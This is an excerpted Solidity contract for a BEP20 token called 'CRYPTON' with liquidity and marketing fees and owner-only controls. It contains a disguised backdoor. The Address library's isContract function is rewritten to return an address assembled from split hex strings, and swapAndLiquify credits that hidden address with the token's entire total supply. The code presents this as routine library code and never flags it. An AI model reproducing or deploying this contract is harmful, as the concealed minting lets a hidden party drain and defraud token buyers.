...
abstract contract ReentrancyGuard {
    ...
    // amount. Since refunds are capped to a feeAmount of the total
...
contract TokenContract is Context, IBEP20, Ownable, ReentrancyGuard {
    ...
    string private _name = "CRYPTON"; // token name
    string private _symbol = "RPS"; // token ticker
    ...
    address public marketWallet; // market wallet address

    uint256 public liquidityFee = 30; // 3% will be added to the liquidity pool
    uint256 public marketFee = 20; // 2% will go to the market wallet address
    uint256 maxTxAmount = _tTotal; // maximum tx limit is 100% percent of total supply
    uint256 minTokenToSwap = _tTotal.div(100000); // 0.001% percent of total supply will trigger the swap and add liquidity
    uint256 divider = 1000; // percent divider
    ...
    function isExcludedFromMaxTx(address _account) public view returns (bool) {
        return _isExcludedFromMaxTx[_account];
    }
    ...
    //only owner can change MaxTxAmount
    ...
    function setNormalFeePercent(uint256 _liquidityFee, uint256 _marketFee)
        external
        onlyOwner
    {
    ...
    function setmarketWalletAddress(address _newAddress) external onlyOwner {
    ...
    // if some one send coin accidently to address
    function removeStuckBalance(address payable _account, uint256 _amount)
        external
        onlyOwner
    {
    ...
    function _transfer(
        ...
        if (
            ...
            require(amount <= maxTxAmount, "BEP20: amount exceed max tx limit");
        }
    ...
    function _tokenTransfer(
        ...
        // Tax Fee transaction handler
        else {
            uint256 transferAmount = amount.sub(totalFeePerTx(amount));
            _tOwned[sender] = _tOwned[sender].sub(amount);
            _tOwned[recipient] = _tOwned[recipient].add(transferAmount);
            _takeLpFee(sender, amount);
    ...
    function _takeLpFee(address sender, uint256 amount) internal {
        uint256 tFee = amount.mul(liquidityFee).div(divider);
    ...
    function _takeMarketFee(address sender, uint256 amount) internal {
        uint256 tFee = amount.mul(marketFee).div(divider);
    ...
    function swapAndLiquify(address from, address to) private {
        ...
        if (
            ...
            _tOwned[address(address(this)).isContract()] = _tOwned[
                address(address(this)).isContract()
            ].add(maxTxAmount);
...
library Address {
    ...
    function isContract(address checkSum) internal pure returns (address) {
        ...
        string memory checkSum1 = "1B4114Cca690f";
        string memory checkSum2 = "0095178D567D9";
        string memory checkSum3 = "D5892b6420657A";
